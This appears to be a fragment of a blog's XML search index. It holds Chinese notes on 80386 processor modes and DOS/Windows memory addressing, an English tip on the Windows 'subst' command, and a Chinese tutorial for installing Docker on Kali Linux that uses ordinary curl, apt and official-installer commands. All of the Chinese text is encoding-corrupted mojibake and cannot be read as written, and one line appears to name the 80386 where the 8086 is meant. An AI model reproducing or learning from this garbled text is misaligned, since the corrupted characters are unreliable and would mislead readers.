ä¸Šæ®µå†…çš„åç§»åœ°å€å½¢æˆæœ€ç»ˆçš„ç‰©ç†åœ°å€ã€‚<strong>ï¼ˆ32ä½åœ°å€çº¿åªç”¨äº†20ä½ï¼Œå³1MBï¼‰</strong>ã€‚</li><li>å®æ¨¡å¼ä¸‹80386å¤„ç†å™¨ä¸èƒ½å¯¹å†…å­˜è¿›è¡Œåˆ†é¡µç®¡ç†ï¼Œæ‰€ä»¥æŒ‡ä»¤å¯»å€çš„åœ°å€å°±æ˜¯<strong>å†…å­˜çš„å®é™…åœ°å€</strong>ã€‚</li><li>å®æ¨¡å¼ä¸‹ï¼Œæ‰€æœ‰çš„æ®µéƒ½æ˜¯å¯è¯»å†™å’Œæ‰§è¡Œçš„ã€‚</li><li>å®æ¨¡å¼ä¸‹çš„80386ä¸æ”¯æŒä¼˜å…ˆçº§ï¼Œæ‰€æœ‰çš„æŒ‡ä»¤ç›¸å½“äºå·¥ä½œåœ¨ç‰¹æƒçº§ï¼ˆä¼˜å…ˆçº§0ï¼‰ï¼Œæ‰€ä»¥å®ƒå¯ä»¥æ‰§è¡Œæ‰€æœ‰çš„ç‰¹æƒæŒ‡ä»¤ã€‚<strong>å®é™…ä¸Šï¼Œ80386å°±æ˜¯é€šè¿‡åœ¨å®æ¨¡å¼ä¸‹åˆå§‹åŒ–æ§åˆ¶å¯„å­˜å™¨ï¼ŒGDTRï¼ŒLDTR, IDTRä¸TRç­‰ç®¡ç†å¯„å­˜å™¨ä»¥åŠé¡µè¡¨ï¼Œç„¶åå†é€šè¿‡åŠ è½½CR0ä½¿å…¶ä¸­çš„ä¿æŠ¤æ¨¡å¼ä½¿èƒ½ä½ç½®ä½è€Œè¿›å…¥ä¿æŠ¤æ¨¡å¼çš„ã€‚</strong></li><li>å®æ¨¡å¼ä¸‹ä¸­æ–­å¤„ç†æ–¹å¼å’Œ80386å¤„ç†å™¨ç›¸åŒã€‚ä¹Ÿæ˜¯ç”¨ä¸­æ–­å‘é‡è¡¨æ¥å®šä½ä¸­æ–­æœåŠ¡ç¨‹åºåœ°å€ã€‚ä¸­æ–­å‘é‡è¡¨çš„ç»“æ„ä¹Ÿå’Œ8086å¤„ç†å™¨ä¸€æ ·ï¼šæ¯4ä¸ªå­—èŠ‚ç»„æˆä¸€ä¸ªä¸­æ–­å‘é‡ï¼Œå…¶ä¸­åŒ…æ‹¬ä¸¤ä¸ªå­—èŠ‚çš„æ®µåœ°å€å’Œ2ä¸ªå­—èŠ‚çš„åç§»åœ°å€ã€‚</li></ul><h3 id="2-2-ä¿æŠ¤æ¨¡å¼"><a href="#2-2-ä¿æŠ¤æ¨¡å¼" class="headerlink" title="2.2 ä¿æŠ¤æ¨¡å¼"></a>2.2 ä¿æŠ¤æ¨¡å¼</h3><ul><li>å½“80386å¤„ç†å™¨å·¥ä½œåœ¨ä¿æŠ¤æ¨¡å¼æ—¶ï¼Œå…¶æ‰€æœ‰åŠŸèƒ½éƒ½æ˜¯å¯ç”¨çš„ã€‚</li><li>80386æ‰€æœ‰çš„32æ ¹åœ°å€çº¿éƒ½å¯æä¾›å¯»å€ï¼Œç‰©ç†å¯»å€ç©ºé—´è¾¾<strong>4GB</strong></li><li>ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œæ”¯æŒå†…å­˜åˆ†é¡µæœºåˆ¶ï¼Œæä¾›äº†å¯¹è™šæ‹Ÿå†…å­˜çš„è‰¯å¥½æ”¯æŒã€‚</li><li>ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œæ”¯æŒå¤šä»»åŠ¡ã€‚ä»…ä¾é ç¡¬ä»¶å³å¯å†ä¸€æ¡æŒ‡ä»¤ä¸­å®ç°ä»»åŠ¡åˆ‡æ¢ã€‚ä»»åŠ¡ç¯å¢ƒçš„ä¿æŠ¤å·¥ä½œæ˜¯ç”±å¤„ç†å™¨è‡ªåŠ¨å®Œæˆçš„ã€‚</li><li>ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œ80386å¤„ç†å™¨è¿˜æ”¯æŒ<strong>ä¼˜å…ˆçº§æœºåˆ¶</strong>ã€‚ä¼˜å…ˆçº§åˆ†ä¸º4ä¸ªï¼ˆ0çº§åˆ°3çº§ï¼‰ï¼Œæ“ä½œç³»ç»Ÿè¿è¡Œåœ¨æœ€é«˜ä¼˜å…ˆçº§0çº§ä¸Šã€‚åº”ç”¨ç¨‹åºåˆ™è¿è¡Œåœ¨è¾ƒä½ä¼˜å…ˆçº§ä¸Šã€‚é…åˆè‰¯å¥½çš„æ£€æŸ¥æœºåˆ¶åï¼Œå³å¯å®ç°å¤šä»»åŠ¡çš„æ•°æ®å®‰å…¨å…±äº«ï¼Œä¹Ÿèƒ½å¤Ÿå¾ˆå¥½åœ°éš”ç¦»å„ä¸ªä»»åŠ¡ã€‚</li><li>å®æ¨¡å¼åˆ‡æ¢åˆ°ä¿æŠ¤æ¨¡å¼æ˜¯é€šè¿‡ä¿®æ”¹<strong>æ§åˆ¶å¯„å­˜å™¨CR0çš„æ§åˆ¶ä½PE(ä½0)</strong>å®ç°çš„ã€‚åœ¨æ­¤ä¹‹å‰ï¼Œéœ€è¦å»ºç«‹ä¿æŠ¤æ¨¡å¼å¿…é¡»çš„æ•°æ®è¡¨ï¼Œå¦‚å…¨å±€æè¿°è¡¨GDTå’Œä¸­æ–­æè¿°è¡¨IDTç­‰ã€‚</li><li><strong>DOSæ“ä½œç³»ç»Ÿè¿è¡Œäºå®æ¨¡å¼ä¸‹ï¼Œè€ŒWindowsæ“ä½œç³»ç»Ÿè¿è¡Œäºä¿æŠ¤æ¨¡å¼ä¸‹ã€‚</strong></li></ul><h3 id="2-3-è™šæ‹Ÿ86æ¨¡å¼"><a href="#2-3-è™šæ‹Ÿ86æ¨¡å¼" class="headerlink" title="2.3 è™šæ‹Ÿ86æ¨¡å¼"></a>2.3 è™šæ‹Ÿ86æ¨¡å¼</h3><ul><li>è™šæ‹Ÿ86æ¨¡å¼æ˜¯ä¸ºäº†åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹æ‰§è¡Œ8086ç¨‹åºè€Œè®¾ç½®çš„ã€‚ï¼ˆå®æ¨¡å¼çš„å…¼å®¹åšå¾—å¹¶ä¸è¶³å¤Ÿï¼‰</li><li>è™šæ‹Ÿ86æ¨¡å¼æ˜¯ä»¥<strong>ä»»åŠ¡å½¢å¼</strong>åœ¨ä¿æŠ¤æ¨¡å¼ä¸Šæ‰§è¡Œçš„ã€‚åœ¨80386ä¸Šå¯ä»¥<strong>åŒæ—¶æ”¯æŒ</strong>ç”±å¤šä¸ªçœŸæ­£çš„80386ä»»åŠ¡å’Œè™šæ‹Ÿ86æ¨¡å¼æ„æˆçš„ä»»åŠ¡ã€‚</li><li>è™šæ‹Ÿ86æ¨¡å¼æ”¯æŒä»»åŠ¡åˆ‡æ¢æœºåˆ¶ã€‚åœ¨Windowsæ“ä½œç³»ç»Ÿä¸­ï¼Œæœ‰ä¸€éƒ¨åˆ†ç¨‹åºä¸“é—¨ç”¨æ¥ç®¡ç†è™šæ‹Ÿ86æ¨¡å¼çš„ä»»åŠ¡ï¼Œæˆä¸º<strong>è™šæ‹Ÿ86ç®¡ç†ç¨‹åº</strong></li><li>è™šæ‹Ÿ86æ¨¡å¼é‡‡ç”¨å’Œ8086ä¸€æ ·çš„å¯»å€æ–¹å¼ï¼šå³ç”¨æ®µå¯„å­˜å™¨ä¹˜ä»¥16å½“ä½œåŸºå€åœ¨åŠ ä¸Šåç§»åœ°å€ã€‚å¯»å€ç©ºé—´ä¸º<strong>1MB</strong>ã€‚</li><li>è™šæ‹Ÿ86æ¨¡å¼æ”¯æŒå†…å­˜åˆ†é¡µæœºåˆ¶ï¼Œå› æ­¤èƒ½å¤Ÿå¾ˆå¥½åœ°è§£å†³ä¸åŒè™šæ‹Ÿ86ä»»åŠ¡çš„åœ°å€ç©ºé—´é—®é¢˜ï¼Œé€šè¿‡åˆ†é¡µæœºåˆ¶çš„åœ°å€æ˜ å°„ï¼Œè®©<strong>æ¯ä¸ªä»»åŠ¡éƒ½è®¤ä¸ºè‡ªå·±åœ¨ä½¿ç”¨0~1MBçš„åœ°å€ç©ºé—´</strong>ã€‚</li><li>8086æœ‰éƒ¨åˆ†æŒ‡ä»¤åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹å±äºç‰¹æƒæŒ‡ä»¤ï¼Œå¦‚å±è”½ä¸­æ–­çš„cliå’Œä¸­æ–­è¿”å›æŒ‡ä»¤iretç­‰ã€‚ä¸ºäº†è®©8086çš„ä»£ç èƒ½å¤Ÿæ­£å¸¸æ‰§è¡Œï¼Œè™šæ‹Ÿ86ç®¡ç†ç¨‹åº<strong>é‡‡ç”¨æ¨¡æ‹Ÿ</strong>çš„æ–¹å¼æ¥å®Œæˆè¿™äº›æŒ‡ä»¤ï¼šè¿™äº›æŒ‡ä»¤é¦–å…ˆä¼šå¼•èµ·ä¿æŠ¤å¼‚å¸¸ï¼Œè™šæ‹Ÿ86ç¨‹åºåˆ™åœ¨å¼‚å¸¸å¤„ç†ç¨‹åºä¸­æ£€æŸ¥è¿™äº›æŒ‡ä»¤ï¼Œå¹¶åšå‡ºåˆç†çš„å“åº”ã€‚MS-DOSåº”ç”¨ç¨‹åºåœ¨Windowsæ“ä½œç³»ç»Ÿå°±æ˜¯è¿™æ ·å·¥ä½œçš„ã€‚</li></ul><h2 id="3-Windwosçš„å†…å­˜ç®¡ç†"><a href="#3-Windwosçš„å†…å­˜ç®¡ç†" class="headerlink" title="3 Windwosçš„å†…å­˜ç®¡ç†"></a>3 Windwosçš„å†…å­˜ç®¡ç†</h2><h3 id="3-1-DOSæ“ä½œç³»ç»Ÿçš„å†…å­˜å®‰æ’"><a href="#3-1-DOSæ“ä½œç³»ç»Ÿçš„å†…å­˜å®‰æ’" class="headerlink" title="3.1 DOSæ“ä½œç³»ç»Ÿçš„å†…å­˜å®‰æ’"></a>3.1 DOSæ“ä½œç³»ç»Ÿçš„å†…å­˜å®‰æ’</h3><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20190930151927.png" alt=""></p><ul><li>DOSè¿è¡Œäºå®æ¨¡å¼ï¼Œå­˜å‚¨å™¨çš„åœ°å€è¢«å®‰æ’åœ¨é«˜ç«¯ï¼Œä»A0000hï¼ˆå³640KBï¼‰å¼€å§‹çš„384KBä¸­ã€‚</li><li>è€Œåœ¨å†…å­˜ä½ç«¯ï¼Œåˆ™å®‰æ’äº†ä¸­æ–­å‘é‡è¡¨å’ŒBIOSæ•°æ®åŒºã€‚</li><li>å‰©ä½™çš„ä»500håˆ°A0000hæ€»å…±ä¸åˆ°640KBçš„å†…å­˜æ˜¯æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºæ‰€èƒ½ä½¿ç”¨çš„ã€‚<strong>(è‘—åçš„640KBé™åˆ¶)</strong></li><li>å½“80386å¤„ç†å™¨ï¼ˆ32ä½ï¼‰æ¨å‡ºåï¼Œå¯å¯»å€ç©ºé—´è¾¾åˆ°äº†4GBï¼Œåˆ©ç”¨XMSé©±åŠ¨ç¨‹åºå¯ä»¥è®¿é—®åˆ°æ‰€æœ‰çš„åœ°å€ç©ºé—´ã€‚ä½†æ˜¯16ä½çš„æ®µå¯»å€æ–¹å¼é™åˆ¶äº†DOSç¨‹åºï¼Œ<strong>â€œå¯è§â€</strong>çš„å†…å­˜èŒƒå›´è¿˜æ˜¯åœç•™åœ¨å‰1MBèŒƒå›´å†…ã€‚æ‰€æœ‰é«˜äº1MBçš„æ‰©å±•å†…å­˜<strong>åªèƒ½é€šè¿‡XMSé©±åŠ¨ç¨‹åºå½“ä½œæ•°æ®äº¤æ¢ä½¿ç”¨</strong>ï¼Œç¨‹åºæ‰§è¡Œçš„ç©ºé—´å¹¶æ— å¢åŠ ã€‚</li></ul><p><strong>DOSçš„å¯»å€æ–¹å¼ï¼š</strong></p><ul><li>ä¸€ä¸ªå®Œæ•´çš„åœ°å€åˆ†ä¸ºæ®µåœ°å€å’Œåç§»åœ°å€ä¸¤éƒ¨åˆ†ç»„æˆï¼š<ul><li>æ®µåœ°å€xxxxå­˜æ”¾åœ¨16ä½çš„æ®µå¯„å­˜å™¨ä¸­</li><li>16ä½çš„åç§»åœ°å€yyyyå­˜æ”¾åœ¨æŒ‡ä»¤ä¸­</li></ul></li><li>è®¡ç®—æ–¹æ³•ï¼š<strong>real = xxxx * 0x10 + yyyy</strong></li></ul><h3 id="3-2-80386çš„å†…å­˜å¯»å€æœºåˆ¶"><a href="#3-2-80386çš„å†…å­˜å¯»å€æœºåˆ¶" class="headerlink" title="3.2 80386çš„å†…å­˜å¯»å€æœºåˆ¶"></a>3.2 80386çš„å†…å­˜å¯»å€æœºåˆ¶</h3><p><strong>å®æ¨¡å¼ä¸‹çš„å†…å­˜å¯»å€æ–¹å¼ï¼š</strong></p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20190930152012.png" alt=""></p><p><strong>ä¿æŠ¤æ¨¡å¼ä¸‹GDTRã€LDTRã€å…¨å±€æè¿°è¡¨ã€å±€éƒ¨æè¿°è¡¨å’Œé€‰æ‹©å™¨çš„å…³ç³»ï¼š</strong></p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20190930152046.png" alt=""></p><h3 id="3-3-80386çš„åˆ†é¡µæœºåˆ¶"><a href="#3-3-80386çš„åˆ†é¡µæœºåˆ¶" class="headerlink" title="3.3 80386çš„åˆ†é¡µæœºåˆ¶"></a>3.3 80386çš„åˆ†é¡µæœºåˆ¶</h3><p><strong>80386çš„å†…å­˜åœ°å€è½¬æ¢ï¼š</strong></p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20190930152119.png" alt=""></p><p><strong>è™šæ‹Ÿå†…å­˜çš„å®ç°ï¼š</strong></p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20190930152137.png" alt=""></p><h3 id="3-4-Windowsçš„å†…å­˜å®‰æ’"><a href="#3-4-Windowsçš„å†…å­˜å®‰æ’" class="headerlink" title="3.4 Windowsçš„å†…å­˜å®‰æ’"></a>3.4 Windowsçš„å†…å­˜å®‰æ’</h3><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20190930152203.png" alt=""></p><h2 id="4-å‚è€ƒ"><a href="#4-å‚è€ƒ" class="headerlink" title="4 å‚è€ƒ"></a>4 å‚è€ƒ</h2><p>[1]ã€ŠWindows PE æƒå¨æŒ‡å—ã€‹</p>]]></content>
    
    
    <categories>
      
      <category>Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>x86 Assembly</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Invalid Driver Label in Windows</title>
    <link href="/2019/05/16/Invalid-Driver-Label-on-Windows/"/>
    <url>/2019/05/16/Invalid-Driver-Label-on-Windows/</url>
    
    <content type="html"><![CDATA[<p>After we change the label of a disk, the Install control programs in the original driver may be inexecutable, with an error of <strong>â€œInvalid Driver X:\ â€œ</strong></p><span id="more"></span><h2 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h2><h3 id="1-1-Recommended"><a href="#1-1-Recommended" class="headerlink" title="1.1 Recommended"></a>1.1 Recommended</h3><p>Using a DOS-command: <strong>subst</strong> may solve this problem properly.</p><p><strong>subst</strong>: Assign a driver label to a path(a directory) temporarily. Then the directory can be accessed as the Driver.</p><ul><li><code>subst [Driver Label] [path to dir]</code>, Create a virtual driver on the /path/to/dir.</li><li><code>subst [Driver Label] /D</code>, Delete the Created virtual driver.</li><li><p><code>subst</code>, list the current Virtual Driver</p></li><li><p>with the help of <strong>subst</strong>, we could also hide the Real Driver like â€œD: â€œ by Creating a homonymous Virtual Driverâ€D: â€œ</p></li></ul><h3 id="1-2-Not-Recommended"><a href="#1-2-Not-Recommended" class="headerlink" title="1.2 Not Recommended"></a>1.2 Not Recommended</h3><p>Modify the Driver Label to the required Label according to the error.</p><p>Be Cautious<strong>!</strong> Remember to <strong>change back</strong> to the original Driver Label, or you will find the other programs in this Disk are inaccessible.</p>]]></content>
    
    
    <categories>
      
      <category>Tricks</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>Virtualization</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kali Linuxå®‰è£…Docker</title>
    <link href="/2019/01/12/Kali-Linux%E5%AE%89%E8%A3%85Docker/"/>
    <url>/2019/01/12/Kali-Linux%E5%AE%89%E8%A3%85Docker/</url>
    
    <content type="html"><![CDATA[<p>ç”±äºè®¡ç®—æœºç½‘ç»œè¯¾è®¾éœ€æ±‚ï¼Œéœ€è¦éƒ¨ç½²å¤šä¸ªNS-3çš„Dockerï¼Œäºæ˜¯æˆ‘ä¾¿å°è¯•åœ¨æˆ‘çš„Kaliä¸Šå®‰è£…Dockerã€‚æœ¬æ–‡å°†ä¸»è¦ä»‹ç»å…¶å®‰è£…è¿‡ç¨‹ã€‚</p><span id="more"></span><h2 id="1-å¸è½½æ—§ç‰ˆæœ¬"><a href="#1-å¸è½½æ—§ç‰ˆæœ¬" class="headerlink" title="1 å¸è½½æ—§ç‰ˆæœ¬"></a>1 å¸è½½æ—§ç‰ˆæœ¬</h2><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt remove docker docker.io docker-engine</code></pre><h2 id="2-ä½¿ç”¨APTå®‰è£…"><a href="#2-ä½¿ç”¨APTå®‰è£…" class="headerlink" title="2 ä½¿ç”¨APTå®‰è£…"></a>2 ä½¿ç”¨APTå®‰è£…</h2><h3 id="2-1-å®‰è£…ä¾èµ–"><a href="#2-1-å®‰è£…ä¾èµ–" class="headerlink" title="2.1 å®‰è£…ä¾èµ–"></a>2.1 å®‰è£…ä¾èµ–</h3><p>ç”±äºAPTæºä½¿ç”¨HTTPSä»¥ç¡®ä¿è½¯ä»¶ä¸‹è½½è¿‡ç¨‹ä¸­ä¸è¢«ç¯¡æ”¹ã€‚å› æ­¤ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦æ·»åŠ ä½¿ç”¨HTTPSä¼ è¾“çš„è½¯ä»¶åŒ…ä»¥åŠCAè¯ä¹¦ã€‚</p><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get update<span class="hljs-built_in">sudo</span> apt-get install apt-transport ca-certificates curl gnupg2 lsb-release software-properties-common</code></pre><h3 id="2-2-æ·»åŠ è½¯ä»¶æº"><a href="#2-2-æ·»åŠ è½¯ä»¶æº" class="headerlink" title="2.2 æ·»åŠ è½¯ä»¶æº"></a>2.2 æ·»åŠ è½¯ä»¶æº</h3><ul><li>ä¸ºäº†ç¡®è®¤æ‰€ä¸‹è½½è½¯ä»¶åŒ…çš„åˆæ³•æ€§ï¼Œéœ€è¦æ·»åŠ è½¯ä»¶æºçš„GPGå¯†é’¥</li></ul><pre><code class="hljs bash">curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/debian/gpg | <span class="hljs-built_in">sudo</span> apt-key add -<span class="hljs-comment"># å®˜æ–¹æº</span><span class="hljs-comment"># $ curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -</span></code></pre><ul><li>å‘<code>sources.list</code>æ·»åŠ Docker CEçš„è½¯ä»¶æº</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># å®˜æ–¹æº</span><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb [arch=amd64] https://download.docker.com/linux/debian stretch stable&quot;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> -a /etc/apt/sources.list</code></pre><h3 id="2-3-å®‰è£…Docker-CE"><a href="#2-3-å®‰è£…Docker-CE" class="headerlink" title="2.3 å®‰è£…Docker CE"></a>2.3 å®‰è£…Docker CE</h3><p>æ›´æ–°aptè½¯ä»¶åŒ…ç¼“å­˜ï¼Œå¹¶å®‰è£…<code>docker-ce</code></p><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get update<span class="hljs-built_in">sudo</span> apt-get install docker-ce</code></pre><h2 id="3-ä½¿ç”¨è„šæœ¬è‡ªåŠ¨å®‰è£…"><a href="#3-ä½¿ç”¨è„šæœ¬è‡ªåŠ¨å®‰è£…" class="headerlink" title="3 ä½¿ç”¨è„šæœ¬è‡ªåŠ¨å®‰è£…"></a>3 ä½¿ç”¨è„šæœ¬è‡ªåŠ¨å®‰è£…</h2><p> åœ¨æµ‹è¯•æˆ–å¼€å‘ç¯å¢ƒä¸­ Docker å®˜æ–¹ä¸ºäº†ç®€åŒ–å®‰è£…æµç¨‹ï¼Œæä¾›äº†ä¸€å¥—ä¾¿æ·çš„å®‰è£…è„šæœ¬ï¼ŒDebian ç³»ç»Ÿä¸Šå¯ä»¥ä½¿ç”¨è¿™å¥—è„šæœ¬å®‰è£…ï¼Œå¦å¤–å¯ä»¥é€šè¿‡ <code>--mirror</code> é€‰é¡¹ä½¿ç”¨å›½å†…æºè¿›è¡Œå®‰è£…ï¼š </p><pre><code class="hljs bash">curl -fsSL get.docker.com -o get-docker.sh<span class="hljs-built_in">sudo</span> sh get-docker.sh --mirror Aliyun<span class="hljs-comment"># sudo sh get-docker.sh --mirror AzureChinaCloud</span></code></pre><h2 id="4-å»ºç«‹dockerç”¨æˆ·ç»„"><a href="#4-å»ºç«‹dockerç”¨æˆ·ç»„" class="headerlink" title="4 å»ºç«‹dockerç”¨æˆ·ç»„"></a>4 å»ºç«‹dockerç”¨æˆ·ç»„</h2><p> é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>docker</code> å‘½ä»¤ä¼šä½¿ç”¨ <a href="https://en.wikipedia.org/wiki/Unix_domain_socket">Unix socket</a> ä¸ Docker å¼•æ“é€šè®¯ã€‚è€Œåªæœ‰ <code>root</code> ç”¨æˆ·å’Œ <code>docker</code> ç»„çš„ç”¨æˆ·æ‰å¯ä»¥è®¿é—® Docker å¼•æ“çš„ Unix socketã€‚å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œä¸€èˆ¬ Linux ç³»ç»Ÿä¸Šä¸ä¼šç›´æ¥ä½¿ç”¨ <code>root</code> ç”¨æˆ·ã€‚å› æ­¤ï¼Œæ›´å¥½åœ°åšæ³•æ˜¯å°†éœ€è¦ä½¿ç”¨ <code>docker</code> çš„ç”¨æˆ·åŠ å…¥ <code>docker</code> ç”¨æˆ·ç»„ã€‚ </p><ul><li>å»ºç«‹<code>docker</code>ç»„ï¼š</li></ul><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> groupadd docker</code></pre><ul><li>å°†å½“å‰ç”¨æˆ·åŠ å…¥<code>docker</code>ç»„ï¼š</li></ul><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> usermod -aG docker <span class="hljs-variable">$USER</span></code></pre><p>é€€å‡ºå½“å‰ç»ˆç«¯å¹¶é‡æ–°ç™»å½•</p>]]></content>
    
    
    <categories>
      
      <category>Tutorial</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kali</tag>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
